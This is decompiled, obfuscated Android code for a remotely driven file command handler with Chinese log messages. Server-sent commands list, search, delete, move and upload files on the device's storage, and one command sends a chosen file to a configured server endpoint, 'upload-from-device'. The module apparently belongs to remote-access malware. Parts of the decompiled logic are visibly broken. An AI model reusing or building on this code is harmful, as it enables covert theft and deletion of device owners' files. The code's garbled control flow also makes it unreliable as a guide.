package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.C0323a8;
import java.util.Set;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlinx.coroutines.AbstractC0780a0;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC1262tj;
import p000.C1351vv;
import p000.C1492yt;
import p000.C1496yx;
import p000.ExecutorC1158qw;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.kg1;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a4 */
/* loaded from: classes2.dex */
public final class C0347a4 implements InterfaceC0726jp {
    static {
        new C1492yt(null);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("FILE_LIST", "FILE_DOWNLOAD", "FILE_DOWNLOAD_HTTP", "FILE_DELETE", "FILE_RENAME", "FILE_CREATE_FOLDER", "FILE_COPY", "FILE_MOVE", "FILE_SEARCH", "FILE_STORAGE_INFO", "FILE_UPLOAD", "FILE_DOWNLOAD_FROM_SERVER");
    }

    /* JADX WARN: Removed duplicated region for block: B:125:0x020a A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:165:0x02b4 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:199:0x0346 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:236:0x03d5 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:267:0x044d A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:297:0x04c4 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:322:0x0531 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00ab A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:65:0x011e A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:95:0x0197 A[RETURN] */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) throws Throwable {
        String strOptString;
        String str2;
        Object objM213696a7;
        Object objM213696a72;
        String str3;
        Object objM213696a73;
        Object objM213696a74;
        Object objM213696a75;
        Object objM213696a76;
        Object objM213696a77;
        Object objM213696a78;
        Object objM213696a79;
        Object objM213696a710;
        C1351vv c1351vv = C1351vv.f60710b1;
        switch (str.hashCode()) {
            case -1877697650:
                if (str.equals("FILE_CREATE_FOLDER")) {
                    String strOptString2 = jSONObject != null ? jSONObject.optString("path", "") : null;
                    if (strOptString2 == null) {
                        strOptString2 = "";
                    }
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    t60.m214714d6("FileCmdHandler", "创建文件夹: " + strOptString2 + ", requestId=" + str2);
                    C1496yx c1496yxM214866a2 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
                    if (c1496yxM214866a2 == null || !c1496yxM214866a2.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a7 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileCreateFolder$2(null, c1496yxM214866a2, c0323a8M214869a5, strOptString2, str2), interfaceC0876mv);
                        if (objM213696a7 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a7 != CoroutineSingletons.f57606a0) {
                            return objM213696a7;
                        }
                    }
                    objM213696a7 = c1351vv;
                    if (objM213696a7 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case -1798678687:
                if (str.equals("FILE_RENAME")) {
                    String strOptString3 = jSONObject != null ? jSONObject.optString("oldPath", "") : null;
                    if (strOptString3 == null) {
                        strOptString3 = "";
                    }
                    String strOptString4 = jSONObject != null ? jSONObject.optString("newName", "") : null;
                    if (strOptString4 == null) {
                        strOptString4 = "";
                    }
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    StringBuilder sbM41c2 = AbstractC0003a2.m41c2("重命名文件: ", strOptString3, " -> ", strOptString4, ", requestId=");
                    sbM41c2.append(str2);
                    t60.m214714d6("FileCmdHandler", sbM41c2.toString());
                    C1496yx c1496yxM214866a22 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a52 = uz0Var.m214869a5();
                    if (c1496yxM214866a22 == null || !c1496yxM214866a22.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a72 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileRename$2(null, c1496yxM214866a22, c0323a8M214869a52, strOptString3, strOptString4, str2), interfaceC0876mv);
                        if (objM213696a72 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a72 != CoroutineSingletons.f57606a0) {
                            return objM213696a72;
                        }
                    }
                    objM213696a72 = c1351vv;
                    if (objM213696a72 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case -1770420789:
                if (str.equals("FILE_SEARCH")) {
                    String strOptString5 = jSONObject != null ? jSONObject.optString("path", "/sdcard") : null;
                    str3 = strOptString5 != null ? strOptString5 : "/sdcard";
                    String strOptString6 = jSONObject != null ? jSONObject.optString("keyword", "") : null;
                    if (strOptString6 == null) {
                        strOptString6 = "";
                    }
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    StringBuilder sbM41c22 = AbstractC0003a2.m41c2("搜索文件: ", strOptString6, " in ", str3, ", requestId=");
                    sbM41c22.append(str2);
                    t60.m214714d6("FileCmdHandler", sbM41c22.toString());
                    C1496yx c1496yxM214866a23 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a53 = uz0Var.m214869a5();
                    if (c1496yxM214866a23 == null || !c1496yxM214866a23.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a73 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileSearch$2(null, c1496yxM214866a23, c0323a8M214869a53, str3, strOptString6, str2), interfaceC0876mv);
                        if (objM213696a73 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a73 != CoroutineSingletons.f57606a0) {
                            return objM213696a73;
                        }
                    }
                    objM213696a73 = c1351vv;
                    if (objM213696a73 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case -1702679004:
                if (str.equals("FILE_UPLOAD")) {
                    String strOptString7 = jSONObject != null ? jSONObject.optString("path", "") : null;
                    if (strOptString7 == null) {
                        strOptString7 = "";
                    }
                    String strOptString8 = jSONObject != null ? jSONObject.optString("data", "") : null;
                    String str4 = strOptString8 == null ? "" : strOptString8;
                    String strOptString9 = jSONObject != null ? jSONObject.optString("name", "") : null;
                    String str5 = strOptString9 == null ? "" : strOptString9;
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    t60.m214714d6("FileCmdHandler", "上传文件: " + strOptString7 + ", requestId=" + str2);
                    C1496yx c1496yxM214866a24 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a54 = uz0Var.m214869a5();
                    if (c1496yxM214866a24 == null || !c1496yxM214866a24.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a74 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileUpload$2(c1496yxM214866a24, strOptString7, str4, str2, str5, c0323a8M214869a54, null), interfaceC0876mv);
                        if (objM213696a74 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a74 != CoroutineSingletons.f57606a0) {
                            return objM213696a74;
                        }
                    }
                    objM213696a74 = c1351vv;
                    if (objM213696a74 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case -1055900892:
                if (str.equals("FILE_DOWNLOAD_FROM_SERVER")) {
                    String strOptString10 = jSONObject != null ? jSONObject.optString("targetPath", "") : null;
                    if (strOptString10 == null) {
                        strOptString10 = "";
                    }
                    String strOptString11 = jSONObject != null ? jSONObject.optString("fileName", "") : null;
                    String str6 = strOptString11 == null ? "" : strOptString11;
                    long jOptLong = jSONObject != null ? jSONObject.optLong("fileSize", 0L) : 0L;
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    t60.m214714d6("FileCmdHandler", "从服务器下载文件: " + strOptString10 + ", size=" + jOptLong + ", requestId=" + str2);
                    C1496yx c1496yxM214866a25 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a55 = uz0Var.m214869a5();
                    if (c1496yxM214866a25 == null || !c1496yxM214866a25.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a75 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileDownloadFromServer$2(null, c1496yxM214866a25, c0323a8M214869a55, str2, strOptString10, str6), interfaceC0876mv);
                        if (objM213696a75 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a75 != CoroutineSingletons.f57606a0) {
                            return objM213696a75;
                        }
                    }
                    objM213696a75 = c1351vv;
                    if (objM213696a75 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case -28153877:
                if (str.equals("FILE_DOWNLOAD")) {
                    String strOptString12 = jSONObject != null ? jSONObject.optString("path", "") : null;
                    if (strOptString12 == null) {
                        strOptString12 = "";
                    }
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    t60.m214714d6("FileCmdHandler", "下载文件(WebSocket): " + strOptString12 + ", requestId=" + str2);
                    C1496yx c1496yxM214866a26 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a56 = uz0Var.m214869a5();
                    if (c1496yxM214866a26 == null || !c1496yxM214866a26.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a76 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileDownload$2(null, c1496yxM214866a26, c0323a8M214869a56, strOptString12, str2), interfaceC0876mv);
                        if (objM213696a76 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a76 != CoroutineSingletons.f57606a0) {
                            return objM213696a76;
                        }
                    }
                    objM213696a76 = c1351vv;
                    if (objM213696a76 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case 854609397:
                if (str.equals("FILE_STORAGE_INFO")) {
                    String strOptString13 = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString13 != null ? strOptString13 : "";
                    t60.m214714d6("FileCmdHandler", "获取存储信息, requestId=".concat(str2));
                    Object objM213696a711 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileStorageInfo$2(uz0Var.m214866a2(), str2, uz0Var.m214869a5(), null), interfaceC0876mv);
                    CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                    if (objM213696a711 != coroutineSingletons) {
                        objM213696a711 = c1351vv;
                    }
                    if (objM213696a711 == coroutineSingletons) {
                        return objM213696a711;
                    }
                }
                return c1351vv;
            case 1499365464:
                if (str.equals("FILE_COPY")) {
                    String strOptString14 = jSONObject != null ? jSONObject.optString("sourcePath", "") : null;
                    if (strOptString14 == null) {
                        strOptString14 = "";
                    }
                    String strOptString15 = jSONObject != null ? jSONObject.optString("destPath", "") : null;
                    if (strOptString15 == null) {
                        strOptString15 = "";
                    }
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    StringBuilder sbM41c23 = AbstractC0003a2.m41c2("复制文件: ", strOptString14, " -> ", strOptString15, ", requestId=");
                    sbM41c23.append(str2);
                    t60.m214714d6("FileCmdHandler", sbM41c23.toString());
                    C1496yx c1496yxM214866a27 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a57 = uz0Var.m214869a5();
                    if (c1496yxM214866a27 == null || !c1496yxM214866a27.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a77 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileCopy$2(null, c1496yxM214866a27, c0323a8M214869a57, strOptString14, strOptString15, str2), interfaceC0876mv);
                        if (objM213696a77 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a77 != CoroutineSingletons.f57606a0) {
                            return objM213696a77;
                        }
                    }
                    objM213696a77 = c1351vv;
                    if (objM213696a77 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case 1499627905:
                if (str.equals("FILE_LIST")) {
                    String strOptString16 = jSONObject != null ? jSONObject.optString("path", "/sdcard") : null;
                    str3 = strOptString16 != null ? strOptString16 : "/sdcard";
                    boolean zOptBoolean = jSONObject != null ? jSONObject.optBoolean("showHidden", false) : false;
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    t60.m214714d6("FileCmdHandler", "获取文件列表: " + str3 + ", requestId=" + str2);
                    C1496yx c1496yxM214866a28 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a58 = uz0Var.m214869a5();
                    if (c1496yxM214866a28 == null || !c1496yxM214866a28.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a78 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileList$2(c1496yxM214866a28, str3, zOptBoolean, str2, c0323a8M214869a58, null), interfaceC0876mv);
                        if (objM213696a78 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a78 != CoroutineSingletons.f57606a0) {
                            return objM213696a78;
                        }
                    }
                    objM213696a78 = c1351vv;
                    if (objM213696a78 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case 1499663540:
                if (str.equals("FILE_MOVE")) {
                    String strOptString17 = jSONObject != null ? jSONObject.optString("sourcePath", "") : null;
                    if (strOptString17 == null) {
                        strOptString17 = "";
                    }
                    String strOptString18 = jSONObject != null ? jSONObject.optString("destPath", "") : null;
                    if (strOptString18 == null) {
                        strOptString18 = "";
                    }
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    StringBuilder sbM41c24 = AbstractC0003a2.m41c2("移动文件: ", strOptString17, " -> ", strOptString18, ", requestId=");
                    sbM41c24.append(str2);
                    t60.m214714d6("FileCmdHandler", sbM41c24.toString());
                    C1496yx c1496yxM214866a29 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a59 = uz0Var.m214869a5();
                    if (c1496yxM214866a29 == null || !c1496yxM214866a29.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a79 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileMove$2(null, c1496yxM214866a29, c0323a8M214869a59, strOptString17, strOptString18, str2), interfaceC0876mv);
                        if (objM213696a79 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a79 != CoroutineSingletons.f57606a0) {
                            return objM213696a79;
                        }
                    }
                    objM213696a79 = c1351vv;
                    if (objM213696a79 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case 2095424974:
                if (str.equals("FILE_DELETE")) {
                    String strOptString19 = jSONObject != null ? jSONObject.optString("path", "") : null;
                    if (strOptString19 == null) {
                        strOptString19 = "";
                    }
                    strOptString = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    str2 = strOptString != null ? strOptString : "";
                    t60.m214714d6("FileCmdHandler", "删除文件: " + strOptString19 + ", requestId=" + str2);
                    C1496yx c1496yxM214866a210 = uz0Var.m214866a2();
                    C0323a8 c0323a8M214869a510 = uz0Var.m214869a5();
                    if (c1496yxM214866a210 == null || !c1496yxM214866a210.m215321a7()) {
                        uz0Var.m214878b4(str2);
                    } else {
                        objM213696a710 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new FileCommandHandler$handleFileDelete$2(null, c1496yxM214866a210, c0323a8M214869a510, strOptString19, str2), interfaceC0876mv);
                        if (objM213696a710 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a710 != CoroutineSingletons.f57606a0) {
                            return objM213696a710;
                        }
                    }
                    objM213696a710 = c1351vv;
                    if (objM213696a710 != CoroutineSingletons.f57606a0) {
                    }
                }
                return c1351vv;
            case 2121632860:
                if (str.equals("FILE_DOWNLOAD_HTTP")) {
                    Object objM211878a3 = m211878a3(jSONObject, uz0Var, (ContinuationImpl) interfaceC0876mv);
                    if (objM211878a3 == CoroutineSingletons.f57606a0) {
                        return objM211878a3;
                    }
                }
                return c1351vv;
            default:
                return c1351vv;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211878a3(JSONObject jSONObject, uz0 uz0Var, ContinuationImpl continuationImpl) throws Throwable {
        FileCommandHandler$handleFileDownloadHttp$1 fileCommandHandler$handleFileDownloadHttp$1;
        uz0 uz0Var2;
        String str;
        String strM211646b2;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof FileCommandHandler$handleFileDownloadHttp$1) {
            fileCommandHandler$handleFileDownloadHttp$1 = (FileCommandHandler$handleFileDownloadHttp$1) continuationImpl;
            int i = fileCommandHandler$handleFileDownloadHttp$1.f53471a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                fileCommandHandler$handleFileDownloadHttp$1.f53471a4 = i - Integer.MIN_VALUE;
            } else {
                fileCommandHandler$handleFileDownloadHttp$1 = new FileCommandHandler$handleFileDownloadHttp$1(this, continuationImpl);
            }
        }
        Object obj = fileCommandHandler$handleFileDownloadHttp$1.f53469a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = fileCommandHandler$handleFileDownloadHttp$1.f53471a4;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            String str2 = "";
            String strOptString = jSONObject != null ? jSONObject.optString("path", "") : null;
            String str3 = strOptString == null ? "" : strOptString;
            String strOptString2 = jSONObject != null ? jSONObject.optString("requestId", "") : null;
            String str4 = strOptString2 == null ? "" : strOptString2;
            C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
            if (c0323a8M214869a5 != null && (strM211646b2 = c0323a8M214869a5.m211646b2()) != null) {
                str2 = strM211646b2;
            }
            String strConcat = str2.concat("/api/file/upload-from-device");
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("下载文件(HTTP直传): ", str3, ", requestId=", str4, ", uploadUrl=");
            sbM41c2.append(strConcat);
            t60.m214714d6("FileCmdHandler", sbM41c2.toString());
            if (strConcat.length() == 0 || str2.length() == 0) {
                t60.m214704c5("FileCmdHandler", "服务器地址未配置");
                return c1351vv;
            }
            C1496yx c1496yxM214866a2 = uz0Var.m214866a2();
            if (c1496yxM214866a2 == null || !c1496yxM214866a2.m215321a7()) {
                ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
                FileCommandHandler$handleFileDownloadHttp$2 fileCommandHandler$handleFileDownloadHttp$2 = new FileCommandHandler$handleFileDownloadHttp$2(c1496yxM214866a2, strConcat, str4, null);
                uz0Var2 = uz0Var;
                fileCommandHandler$handleFileDownloadHttp$1.f53467a0 = uz0Var2;
                fileCommandHandler$handleFileDownloadHttp$1.f53468a1 = str4;
                fileCommandHandler$handleFileDownloadHttp$1.f53471a4 = 1;
                if (AbstractC0780a0.m213696a7(executorC1158qw, fileCommandHandler$handleFileDownloadHttp$2, fileCommandHandler$handleFileDownloadHttp$1) != coroutineSingletons) {
                    str = str4;
                }
            } else {
                ExecutorC1158qw executorC1158qw2 = AbstractC1262tj.f60234a1;
                FileCommandHandler$handleFileDownloadHttp$3 fileCommandHandler$handleFileDownloadHttp$3 = new FileCommandHandler$handleFileDownloadHttp$3(c1496yxM214866a2, str3, strConcat, str4, null);
                fileCommandHandler$handleFileDownloadHttp$1.f53471a4 = 2;
                Object objM213696a7 = AbstractC0780a0.m213696a7(executorC1158qw2, fileCommandHandler$handleFileDownloadHttp$3, fileCommandHandler$handleFileDownloadHttp$1);
                if (objM213696a7 != coroutineSingletons) {
                    return objM213696a7;
                }
            }
            return coroutineSingletons;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return obj;
        }
        str = fileCommandHandler$handleFileDownloadHttp$1.f53468a1;
        uz0 uz0Var3 = fileCommandHandler$handleFileDownloadHttp$1.f53467a0;
        kg1.m213544f4(obj);
        uz0Var2 = uz0Var3;
        uz0Var2.m214878b4(str);
        return c1351vv;
    }
}
